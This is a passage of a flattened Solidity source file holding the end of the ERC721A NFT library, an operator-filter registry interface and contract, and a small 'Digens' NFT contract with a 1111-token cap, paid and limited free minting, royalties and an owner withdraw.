1047                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1048             );
1049 
1050             uint256 toMasked;
1051             uint256 end = startTokenId + quantity;
1052 
1053             // Use assembly to loop and emit the `Transfer` event for gas savings.
1054             // The duplicated `log4` removes an extra check and reduces stack juggling.
1055             // The assembly, together with the surrounding Solidity code, have been
1056             // delicately arranged to nudge the compiler into producing optimized opcodes.
1057             assembly {
1058                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1059                 toMasked := and(to, _BITMASK_ADDRESS)
1060                 // Emit the `Transfer` event.
1061                 log4(
1062                     0, // Start of data (0, since no data).
1063                     0, // End of data (0, since no data).
1064                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1065                     0, // `address(0)`.
1066                     toMasked, // `to`.
1067                     startTokenId // `tokenId`.
1068                 )
1069 
1070                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1071                 // that overflows uint256 will make the loop run out of gas.
1072                 // The compiler will optimize the `iszero` away for performance.
1073                 for {
1074                     let tokenId := add(startTokenId, 1)
1075                 } iszero(eq(tokenId, end)) {
1076                     tokenId := add(tokenId, 1)
1077                 } {
1078                     // Emit the `Transfer` event. Similar to above.
1079                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1080                 }
1081             }
1082             if (toMasked == 0) revert MintToZeroAddress();
1083 
1084             _currentIndex = end;
1085         }
1086         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1087     }
1088 
1089     /**
1090      * @dev Mints `quantity` tokens and transfers them to `to`.
1091      *
1092      * This function is intended for efficient minting only during contract creation.
1093      *
1094      * It emits only one {ConsecutiveTransfer} as defined in
1095      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1096      * instead of a sequence of {Transfer} event(s).
1097      *
1098      * Calling this function outside of contract creation WILL make your contract
1099      * non-compliant with the ERC721 standard.
1100      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1101      * {ConsecutiveTransfer} event is only permissible during contract creation.
1102      *
1103      * Requirements:
1104      *
1105      * - `to` cannot be the zero address.
1106      * - `quantity` must be greater than 0.
1107      *
1108      * Emits a {ConsecutiveTransfer} event.
1109      */
1110     function _mintERC2309(address to, uint256 quantity) internal virtual {
1111         uint256 startTokenId = _currentIndex;
1112         if (to == address(0)) revert MintToZeroAddress();
1113         if (quantity == 0) revert MintZeroQuantity();
1114         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1115 
1116         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1117 
1118         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1119         unchecked {
1120             // Updates:
1121             // - `balance += quantity`.
1122             // - `numberMinted += quantity`.
1123             //
1124             // We can directly add to the `balance` and `numberMinted`.
1125             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1126 
1127             // Updates:
1128             // - `address` to the owner.
1129             // - `startTimestamp` to the timestamp of minting.
1130             // - `burned` to `false`.
1131             // - `nextInitialized` to `quantity == 1`.
1132             _packedOwnerships[startTokenId] = _packOwnershipData(
1133                 to,
1134                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1135             );
1136 
1137             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1138 
1139             _currentIndex = startTokenId + quantity;
1140         }
1141         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1142     }
1143 
1144     /**
1145      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1146      *
1147      * Requirements:
1148      *
1149      * - If `to` refers to a smart contract, it must implement
1150      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1151      * - `quantity` must be greater than 0.
1152      *
1153      * See {_mint}.
1154      *
1155      * Emits a {Transfer} event for each mint.
1156      */
1157     function _safeMint(
1158         address to,
1159         uint256 quantity,
1160         bytes memory _data
1161     ) internal virtual {
1162         _mint(to, quantity);
1163 
1164         unchecked {
1165             if (to.code.length != 0) {
1166                 uint256 end = _currentIndex;
1167                 uint256 index = end - quantity;
1168                 do {
1169                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1170                         revert TransferToNonERC721ReceiverImplementer();
1171                     }
1172                 } while (index < end);
1173                 // Reentrancy protection.
1174                 if (_currentIndex != end) revert();
1175             }
1176         }
1177     }
1178 
1179     /**
1180      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1181      */
1182     function _safeMint(address to, uint256 quantity) internal virtual {
1183         _safeMint(to, quantity, '');
1184     }
1185 
1186     // =============================================================
1187     //                        BURN OPERATIONS
1188     // =============================================================
1189 
1190     /**
1191      * @dev Equivalent to `_burn(tokenId, false)`.
1192      */
1193     function _burn(uint256 tokenId) internal virtual {
1194         _burn(tokenId, false);
1195     }
1196 
1197     /**
1198      * @dev Destroys `tokenId`.
1199      * The approval is cleared when the token is burned.
1200      *
1201      * Requirements:
1202      *
1203      * - `tokenId` must exist.
1204      *
1205      * Emits a {Transfer} event.
1206      */
1207     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1208         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1209 
1210         address from = address(uint160(prevOwnershipPacked));
1211 
1212         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1213 
1214         if (approvalCheck) {
1215             // The nested ifs save around 20+ gas over a compound boolean condition.
1216             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1217                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1218         }
1219 
1220         _beforeTokenTransfers(from, address(0), tokenId, 1);
1221 
1222         // Clear approvals from the previous owner.
1223         assembly {
1224             if approvedAddress {
1225                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1226                 sstore(approvedAddressSlot, 0)
1227             }
1228         }
1229 
1230         // Underflow of the sender's balance is impossible because we check for
1231         // ownership above and the recipient's balance can't realistically overflow.
1232         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1233         unchecked {
1234             // Updates:
1235             // - `balance -= 1`.
1236             // - `numberBurned += 1`.
1237             //
1238             // We can directly decrement the balance, and increment the number burned.
1239             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1240             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1241 
1242             // Updates:
1243             // - `address` to the last owner.
1244             // - `startTimestamp` to the timestamp of burning.
1245             // - `burned` to `true`.
1246             // - `nextInitialized` to `true`.
1247             _packedOwnerships[tokenId] = _packOwnershipData(
1248                 from,
1249                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1250             );
1251 
1252             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1253             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1254                 uint256 nextTokenId = tokenId + 1;
1255                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1256                 if (_packedOwnerships[nextTokenId] == 0) {
1257                     // If the next slot is within bounds.
1258                     if (nextTokenId != _currentIndex) {
1259                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1260                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1261                     }
1262                 }
1263             }
1264         }
1265 
1266         emit Transfer(from, address(0), tokenId);
1267         _afterTokenTransfers(from, address(0), tokenId, 1);
1268 
1269         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1270         unchecked {
1271             _burnCounter++;
1272         }
1273     }
1274 
1275     // =============================================================
1276     //                     EXTRA DATA OPERATIONS
1277     // =============================================================
1278 
1279     /**
1280      * @dev Directly sets the extra data for the ownership data `index`.
1281      */
1282     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1283         uint256 packed = _packedOwnerships[index];
1284         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1285         uint256 extraDataCasted;
1286         // Cast `extraData` with assembly to avoid redundant masking.
1287         assembly {
1288             extraDataCasted := extraData
1289         }
1290         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1291         _packedOwnerships[index] = packed;
1292     }
1293 
1294     /**
1295      * @dev Called during each token transfer to set the 24bit `extraData` field.
1296      * Intended to be overridden by the cosumer contract.
1297      *
1298      * `previousExtraData` - the value of `extraData` before transfer.
1299      *
1300      * Calling conditions:
1301      *
1302      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1303      * transferred to `to`.
1304      * - When `from` is zero, `tokenId` will be minted for `to`.
1305      * - When `to` is zero, `tokenId` will be burned by `from`.
1306      * - `from` and `to` are never both zero.
1307      */
1308     function _extraData(
1309         address from,
1310         address to,
1311         uint24 previousExtraData
1312     ) internal view virtual returns (uint24) {}
1313 
1314     /**
1315      * @dev Returns the next extra data for the packed ownership data.
1316      * The returned result is shifted into position.
1317      */
1318     function _nextExtraData(
1319         address from,
1320         address to,
1321         uint256 prevOwnershipPacked
1322     ) private view returns (uint256) {
1323         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1324         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1325     }
1326 
1327     // =============================================================
1328     //                       OTHER OPERATIONS
1329     // =============================================================
1330 
1331     /**
1332      * @dev Returns the message sender (defaults to `msg.sender`).
1333      *
1334      * If you are writing GSN compatible contracts, you need to override this function.
1335      */
1336     function _msgSenderERC721A() internal view virtual returns (address) {
1337         return msg.sender;
1338     }
1339 
1340     /**
1341      * @dev Converts a uint256 to its ASCII string decimal representation.
1342      */
1343     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1344         assembly {
1345             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1346             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1347             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1348             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1349             let m := add(mload(0x40), 0xa0)
1350             // Update the free memory pointer to allocate.
1351             mstore(0x40, m)
1352             // Assign the `str` to the end.
1353             str := sub(m, 0x20)
1354             // Zeroize the slot after the string.
1355             mstore(str, 0)
1356 
1357             // Cache the end of the memory to calculate the length later.
1358             let end := str
1359 
1360             // We write the string from rightmost digit to leftmost digit.
1361             // The following is essentially a do-while loop that also handles the zero case.
1362             // prettier-ignore
1363             for { let temp := value } 1 {} {
1364                 str := sub(str, 1)
1365                 // Write the character to the pointer.
1366                 // The ASCII index of the '0' character is 48.
1367                 mstore8(str, add(48, mod(temp, 10)))
1368                 // Keep dividing `temp` until zero.
1369                 temp := div(temp, 10)
1370                 // prettier-ignore
1371                 if iszero(temp) { break }
1372             }
1373 
1374             let length := sub(end, str)
1375             // Move the pointer 32 bytes leftwards to make room for the length.
1376             str := sub(str, 0x20)
1377             // Store the length.
1378             mstore(str, length)
1379         }
1380     }
1381 }
1382 
1383 
1384 interface IOperatorFilterRegistry {
1385     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1386     function register(address registrant) external;
1387     function registerAndSubscribe(address registrant, address subscription) external;
1388     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1389     function unregister(address addr) external;
1390     function updateOperator(address registrant, address operator, bool filtered) external;
1391     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1392     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1393     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1394     function subscribe(address registrant, address registrantToSubscribe) external;
1395     function unsubscribe(address registrant, bool copyExistingEntries) external;
1396     function subscriptionOf(address addr) external returns (address registrant);
1397     function subscribers(address registrant) external returns (address[] memory);
1398     function subscriberAt(address registrant, uint256 index) external returns (address);
1399     function copyEntriesOf(address registrant, address registrantToCopy) external;
1400     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1401     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1402     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1403     function filteredOperators(address addr) external returns (address[] memory);
1404     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1405     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1406     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1407     function isRegistered(address addr) external returns (bool);
1408     function codeHashOf(address addr) external returns (bytes32);
1409 }
1410 
1411 
1412 /**
1413  * @title  OperatorFilterer
1414  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1415  *         registrant's entries in the OperatorFilterRegistry.
1416  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1417  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1418  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1419  */
1420 abstract contract OperatorFilterer {
1421     error OperatorNotAllowed(address operator);
1422 
1423     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1424         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1425 
1426     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1427         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1428         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1429         // order for the modifier to filter addresses.
1430         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1431             if (subscribe) {
1432                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1433             } else {
1434                 if (subscriptionOrRegistrantToCopy != address(0)) {
1435                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1436                 } else {
1437                     OPERATOR_FILTER_REGISTRY.register(address(this));
1438                 }
1439             }
1440         }
1441     }
1442 
1443     modifier onlyAllowedOperator(address from) virtual {
1444         // Check registry code length to facilitate testing in environments without a deployed registry.
1445         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1446             // Allow spending tokens from addresses with balance
1447             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1448             // from an EOA.
1449             if (from == msg.sender) {
1450                 _;
1451                 return;
1452             }
1453             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1454                 revert OperatorNotAllowed(msg.sender);
1455             }
1456         }
1457         _;
1458     }
1459 
1460     modifier onlyAllowedOperatorApproval(address operator) virtual {
1461         // Check registry code length to facilitate testing in environments without a deployed registry.
1462         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1463             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1464                 revert OperatorNotAllowed(operator);
1465             }
1466         }
1467         _;
1468     }
1469 }
1470 
1471 contract Digens is ERC721A {
1472 
1473     address public owner;
1474 
1475     uint256 public constant maxSupply = 1111;
1476 
1477     uint256 public constant mintPrice = 0.002 ether;
1478 
1479     mapping(address => uint256) private _userForFree;
1480 
1481     mapping(uint256 => uint256) private _userMinted;
1482     
1483     mapping(uint256 => uint256) blockFree; 
1484 
1485     function mint(uint256 amount) payable public {
1486         require(totalSupply() + amount <= maxSupply);
1487         _mint(amount);
1488     }
1489 
1490     function devMint(address addr, uint256 amount) public onlyOwner {
1491         require(totalSupply() + amount <= maxSupply);
1492         _safeMint(addr, amount);
1493     }
1494 
1495     function _mint(uint256 amount) internal {
1496         if (msg.value == 0) {
1497             uint256 t = totalSupply();
1498             if (t > maxSupply / 5) {
1499                 require(balanceOf(msg.sender) == 0);
1500                 uint256 freeNum = (maxSupply - t) / 12;
1501                 require(blockFree[block.number] < freeNum);
1502                 blockFree[block.number]++;
1503             }
1504             _safeMint(msg.sender, 1);
1505             return;
1506         }
1507         require(msg.value >= amount * mintPrice);
1508         _safeMint(msg.sender, amount);
1509     }
1510     
1511     modifier onlyOwner {
1512         require(owner == msg.sender);
1513         _;
1514     }
1515 
1516     constructor() ERC721A("Digens.Wtf", "DIGEN") {
1517         owner = msg.sender;
1518     }
1519 
1520     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1521         return string(abi.encodePacked("ipfs://bafybeiaqxbjpglzx3s4nryfp3wld7npdi5dmfjxpn6af4xlzenrdnxt634/", _toString(tokenId), ".json"));
1522     }
1523 
1524     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1525         uint256 royaltyAmount = (_salePrice * 33) / 1000;
1526         return (owner, royaltyAmount);
1527     }
1528 
1529     function withdraw() external onlyOwner {
1530         payable(msg.sender).transfer(address(this).balance);
1531     }
1532 }